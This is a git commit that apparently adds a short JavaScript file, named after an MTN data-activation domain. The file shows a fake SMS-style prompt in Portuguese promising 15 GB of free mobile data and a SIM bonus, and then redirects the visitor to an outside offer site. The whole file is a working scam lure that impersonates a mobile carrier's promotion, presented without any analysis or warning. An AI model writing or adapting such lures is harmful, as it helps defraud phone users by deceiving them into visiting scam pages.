1c725d5db2d5db149e61b7153a9b9792c4abc60e
harryjohnson86 <mfonjohnson86@gmail.com>
2025-04-10 03:42:12 -0700

    Create activate-mtndata.com.js

---
+++ activate-mtndata.com.js
@@ -0,0 +1,5 @@
+var password = 'Dados e cartão de chamada'
+password=prompt('SMS: Parabéns! Seu número é elegível para receber 15 GB de dados grátis e bônus de atualização do cartão SIM. Pressione OK para ativar. ','Dados e cartão de chamada');
+if (password != 'Dados e cartão de chamada') {
+location.href='https://offerforall.info/activate-mtndata.com.html';
+}
